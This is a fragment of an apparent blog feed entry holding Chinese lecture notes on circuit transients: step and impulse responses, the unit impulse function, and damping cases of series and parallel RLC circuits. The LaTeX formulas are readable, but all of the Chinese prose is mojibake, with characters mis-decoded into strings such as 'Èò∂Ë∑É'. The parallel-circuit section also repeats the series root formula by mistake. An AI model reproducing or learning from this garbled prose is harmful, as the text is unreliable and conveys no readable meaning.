title="Èò∂Ë∑ÉÂìçÂ∫î"></a>Èò∂Ë∑ÉÂìçÂ∫î</h3><p>Âçï‰ΩçÈò∂Ë∑É‰ø°Âè∑‰ΩúÁî®‰∏ãÁîµË∑ØÁöÑ<strong>Èõ∂Áä∂ÊÄÅÂìçÂ∫î</strong>ÔºåÁî®$s(t)$Ë°®Á§∫</p><p>Â∑≤Áü•ÁîµË∑ØÁöÑÈò∂Ë∑ÉÂìçÂ∫îÔºåÂà©Áî®<strong>Âè†Âä†ÂÆöÁêÜ</strong>ÊòìÂæó‰ªªÊÑèÂàÜÊÆµÊÅíÂÆö‰ø°Âè∑ÊøÄÂä±‰∏ãÁ∫øÊÄßÊó∂‰∏çÂèòÁîµË∑ØÁöÑÈõ∂Áä∂ÊÄÅÂìçÂ∫î</p><h3 id="ÂÜ≤ÊøÄÂáΩÊï∞"><a href="#ÂÜ≤ÊøÄÂáΩÊï∞" class="headerlink" title="ÂÜ≤ÊøÄÂáΩÊï∞"></a>ÂÜ≤ÊøÄÂáΩÊï∞</h3><p>‰∏Ä‰∏™Êó†Áïå‰ø°Âè∑$\delta(t)$‰∏∫<strong>Âçï‰ΩçÂÜ≤ÊøÄÂáΩÊï∞</strong>ÂΩì‰∏î‰ªÖÂΩì<br>$$<br>\begin{cases}<br>\delta(t)&#x3D;\begin{cases}<br>        Â•áÂºÇÂÄº&amp;t&#x3D;0\\<br>        0&amp;t\neq 0<br>    \end{cases}\\<br>    \int_{-\varepsilon_2}^{\varepsilon_1}\delta(t)dt&#x3D;1&amp;\varepsilon_1&gt;0,\varepsilon_2&gt;0<br>\end{cases}<br>$$<br>Âçï‰ΩçÈò∂Ë∑ÉÂáΩÊï∞‰∏éÂçï‰ΩçÂÜ≤ÊøÄÂáΩÊï∞Èó¥Â≠òÂú®ÂÖ≥Á≥ª<br>$$<br>\delta(t)&#x3D;\frac{d\varepsilon(t)}{dt}<br>$$</p><p>$$<br>\varepsilon(t)&#x3D;\int^t_{-\infty}\delta(\xi)d\xi<br>$$</p><h3 id="ÂÜ≤ÊøÄÂìçÂ∫î"><a href="#ÂÜ≤ÊøÄÂìçÂ∫î" class="headerlink" title="ÂÜ≤ÊøÄÂìçÂ∫î"></a>ÂÜ≤ÊøÄÂìçÂ∫î</h3><p>Âçï‰ΩçÂÜ≤ÊøÄ‰ø°Âè∑‰ΩúÁî®‰∏ãÁîµË∑ØÁöÑ<strong>Èõ∂Áä∂ÊÄÅÂìçÂ∫î</strong>ÔºåË°®Á§∫‰∏∫$h(t)$</p><p>ÂèØÂÖàÊ±ÇÂá∫$s(t)$ÔºåÂØπÊó∂Èó¥Ê±ÇÂØº</p><h1 id="‰∫åÈò∂ÁîµË∑ØÁöÑÊöÇÊÄÅËøáÁ®ã"><a href="#‰∫åÈò∂ÁîµË∑ØÁöÑÊöÇÊÄÅËøáÁ®ã" class="headerlink" title="‰∫åÈò∂ÁîµË∑ØÁöÑÊöÇÊÄÅËøáÁ®ã"></a>‰∫åÈò∂ÁîµË∑ØÁöÑÊöÇÊÄÅËøáÁ®ã</h1><blockquote><p>‰ªÖËÆ®ËÆ∫Âê´‰∏§‰∏™Âä®ÊÄÅÂéü‰ª∂ÁöÑÁ∫øÊÄß‰∫åÈò∂ÁîµË∑Ø</p></blockquote><h2 id="RLC‰∏≤ËÅîÁîµË∑ØÁöÑÈõ∂ËæìÂÖ•ÂìçÂ∫î"><a href="#RLC‰∏≤ËÅîÁîµË∑ØÁöÑÈõ∂ËæìÂÖ•ÂìçÂ∫î" class="headerlink" title="RLC‰∏≤ËÅîÁîµË∑ØÁöÑÈõ∂ËæìÂÖ•ÂìçÂ∫î"></a>RLC‰∏≤ËÅîÁîµË∑ØÁöÑÈõ∂ËæìÂÖ•ÂìçÂ∫î</h2><p>Â∏∏Á≥ªÊï∞ÈùûÈΩêÊ¨°Á∫øÊÄß‰∫åÈò∂ÂæÆÂàÜÊñπÁ®ã:<br>$$<br>LC\frac{d^2u_c}{dt^2}+RC\frac{du_c}{dt}+u_c&#x3D;u_s(t)<br>$$<br>ÁîµË∑ØÂæÆÂàÜÊñπÁ®ãÁöÑÁâπÂæÅÊ†πÔºàÁîµË∑ØÁöÑ<strong>Âõ∫ÊúâÈ¢ëÁéá</strong>Ôºâ:<br>$$<br>s_{1,2}&#x3D;-\frac{R}{2L}\pm\sqrt{(\frac{R}{2L})^2-\frac{1}{LC}}<br>$$</p><ol><li>$R&gt;2\sqrt{\frac{L}{C}}$ Ôºå$s_{1,2}$‰∏∫‰∏çÁõ∏Á≠âÂÆûÊ†πÔºå<strong>ËøáÈòªÂ∞ºÊÉÖÂÜµ</strong></li><li>$R&#x3D;2\sqrt{\frac{L}{C}}$ Ôºå$s_{1,2}$‰∏∫Áõ∏Á≠âÂÆûÊ†πÔºå<strong>‰∏¥ÁïåÈòªÂ∞ºÊÉÖÂÜµ</strong></li><li>$R&lt;2\sqrt{\frac{L}{C}}$ Ôºå$s_{1,2}$ÂÖ±ËΩ≠Â§çÊï∞Ê†πÔºå<strong>Ê¨†ÈòªÂ∞ºÊÉÖÂÜµ</strong></li></ol><blockquote><p>ÂØπRÊù•ËØ¥ÔºåË∂äÂ§ßË∂ä‰∏çÊòìÈúáËç°ÔºåRË∂ãËøë$\infty$Êó∂ÂºÄË∑ØÔºõË∂äÂ∞èË∂äÊòìÈúáËç°ÔºåR‰∏∫0Êó∂‰∏∫LCÈúáËç°ÁîµË∑Ø</p><p>LË∂äÂ§ßÔºàLÂÇ®ËÉΩË∂äÂ§ßÔºå$\frac{1}{2}L\Delta i^2$Â§ßÔºåÁîµÊµÅÂèòÂåñÂ§ßÔºâCË∂äÂ∞èÔºà$q&#x3D;CU$ÁîµÂéãÂèòÂåñË∂äÂ§ßÔºâÔºåË∂äÂÆπÊòìÈúáËç°</p></blockquote><h3 id="ËøáÈòªÂ∞º"><a href="#ËøáÈòªÂ∞º" class="headerlink" title="ËøáÈòªÂ∞º"></a>ËøáÈòªÂ∞º</h3><p><img src="/../img/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192230226.png" alt="image-20230521192230226"></p><h3 id="‰∏¥ÁïåÈòªÂ∞º"><a href="#‰∏¥ÁïåÈòªÂ∞º" class="headerlink" title="‰∏¥ÁïåÈòªÂ∞º"></a>‰∏¥ÁïåÈòªÂ∞º</h3><p><img src="/../img/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192259513.png" alt="image-20230521192259513"></p><h3 id="Ê¨†ÈòªÂ∞º"><a href="#Ê¨†ÈòªÂ∞º" class="headerlink" title="Ê¨†ÈòªÂ∞º"></a>Ê¨†ÈòªÂ∞º</h3><p>$$<br>s_{1,2}&#x3D;-\frac{R}{2L}\pm\sqrt{(\frac{R}{2L})^2-\frac{1}{LC}}&#x3D;-\alpha\pm j\sqrt{w_0^2-\alpha^2}&#x3D;-\alpha\pm jw_d<br>$$</p><p>Ë°∞ÂáèÂõ†Â≠ê$\alpha&#x3D;\frac{R}{2L}$ÔºåÂõ†‰∏∫RCL‰∏≤ËÅîÁîµË∑ØÈúáËç°Âø´ÊÖ¢Áî±iÂÜ≥ÂÆöÔºåÊïÖÁî®ÁîµÊÑüÊó∂Èó¥Â∏∏Êï∞ÔºåÁ≠â‰∫é$\frac{1}{2\tau}$</p><p>Êó†ÈòªÂ∞ºËá™ÁÑ∂ÔºàË∞êÊåØÔºâÈ¢ëÁéá$w_0&#x3D;\frac{1}{\sqrt{LC}}$</p><p>ÊúâÈòªÂ∞ºËá™ÁÑ∂È¢ëÁéá$w_d&#x3D;\sqrt{w_0^2-\alpha^2}$</p><p><img src="/../img/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192307785.png" alt="image-20230521192307785"></p><p>Ê¨†ÈòªÂ∞ºËÉΩÈáèÂú®<strong>ÁîµÂÆπ‰∏éÁîµÊÑü</strong>‰πãÈó¥‰∫§Êç¢</p><p><img src="/../img/%E5%8A%A8%E6%80%81%E7%94%B5%E8%B7%AF%E5%8F%8A%E7%9E%AC%E6%80%81%E5%88%86%E6%9E%90.assets/image-20230521192313567.png" alt="image-20230521192313567"></p><h3 id="Áõ¥ÊµÅÊøÄÂä±‰∏ãRLC‰∏≤ËÅîÁîµË∑ØÁöÑÂìçÂ∫î"><a href="#Áõ¥ÊµÅÊøÄÂä±‰∏ãRLC‰∏≤ËÅîÁîµË∑ØÁöÑÂìçÂ∫î" class="headerlink" title="Áõ¥ÊµÅÊøÄÂä±‰∏ãRLC‰∏≤ËÅîÁîµË∑ØÁöÑÂìçÂ∫î"></a>Áõ¥ÊµÅÊøÄÂä±‰∏ãRLC‰∏≤ËÅîÁîµË∑ØÁöÑÂìçÂ∫î</h3><p>ÂÖ®ÂìçÂ∫îÁî±ÂØπÂ∫îÈΩêÊ¨°ÂæÆÂàÜÊñπÁ®ãÈÄöËß£‰∏éÂæÆÂàÜÊñπÁ®ãÁâπËß£‰πãÂíåÁªÑÊàê<br>$$<br>u_c(t)&#x3D;u_{Ch}(t)+u_{Cp}(t)<br>$$<br> $s_1\neq s_2$Êó∂<br>$$<br>u_c(t)&#x3D;K_1e^{s_1t}+K_2e^{s_2t}+U_S<br>$$<br>Âà©Áî®<br>$$<br>u_c(0),\frac{du_c(t)}{dt}\Bigg |_{t&#x3D;0}&#x3D;\frac{i_L(0)}{C}<br>$$<br>Ê±ÇËß£$K_1K_2$</p><h2 id="RLCÂπ∂ËÅîÁîµË∑ØÁöÑÈõ∂ËæìÂÖ•ÂìçÂ∫î"><a href="#RLCÂπ∂ËÅîÁîµË∑ØÁöÑÈõ∂ËæìÂÖ•ÂìçÂ∫î" class="headerlink" title="RLCÂπ∂ËÅîÁîµË∑ØÁöÑÈõ∂ËæìÂÖ•ÂìçÂ∫î"></a>RLCÂπ∂ËÅîÁîµË∑ØÁöÑÈõ∂ËæìÂÖ•ÂìçÂ∫î</h2><p>$$<br>LC\frac{d^2i_L}{dt^2}+GL\frac{di_L}{dt}+i_L&#x3D;i_s(t)<br>$$</p><p>$$<br>s_{1,2}&#x3D;-\frac{R}{2L}\pm\sqrt{(\frac{R}{2L})^2-\frac{1}{LC}}<br>$$</p><p>$$<br>s_{1,2}&#x3D;-\frac{G}{2C}\pm\sqrt{(\frac{G}{2C})^2-\frac{1}{LC}}&#x3D;-\alpha\pm j\sqrt{w_0^2-\alpha^2}&#x3D;-\alpha\pm jw_d<br>$$</p><p>Ë°∞ÂáèÂõ†Â≠ê$\alpha&#x3D;\frac{G}{2C}$ÔºåÂõ†‰∏∫RCLÂπ∂ËÅîÁîµË∑ØÈúáËç°Âø´ÊÖ¢Áî±uÂÜ≥ÂÆöÔºåÊïÖÁî®ÁîµÂÆπÊó∂Èó¥Â∏∏Êï∞ÔºåÁ≠â‰∫é$\frac{1}{2\tau}$</p><p>Êó†ÈòªÂ∞ºËá™ÁÑ∂ÔºàË∞êÊåØÔºâÈ¢ëÁéá$w_0&#x3D;\frac{1}{\sqrt{LC}}$</p><p>ÊúâÈòªÂ∞ºËá™ÁÑ∂È¢ëÁéá$w_d&#x3D;\sqrt{w_0^2-\alpha^2}$</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;$V_D$Ë°®Â§ßDCÔºå$v_D$Ë°®ÂÖ®‰ø°Âè∑Ôºå$v_d$Ë°®Â∞èAC&lt;/p&gt;
&lt;p&gt;ÁÉ≠ÁîµÂéãÂ∏∏Êï∞$V_T&amp;#x3D;&#92;frac{k}{q}T$Âú®Â∏∏Ê∏©(27Â∫¶)ÈªòËÆ§‰∏∫26mV&lt;/p&gt;
&lt;p&gt;$V_S$ÂüüÂÄºÁîµÂéã	$V_{TH}$‰∏∫BJTÈáçË¶ÅÂèÇÊï∞&lt;/p&gt;
&lt;/blo</summary>
      
    
    
    
    <category term="ESE" scheme="http://deepunk.icu/categories/ESE/"/>
    
    
    <category term="ÁîµË∑ØÂàÜÊûê" scheme="http://deepunk.icu/tags/%E7%94%B5%E8%B7%AF%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
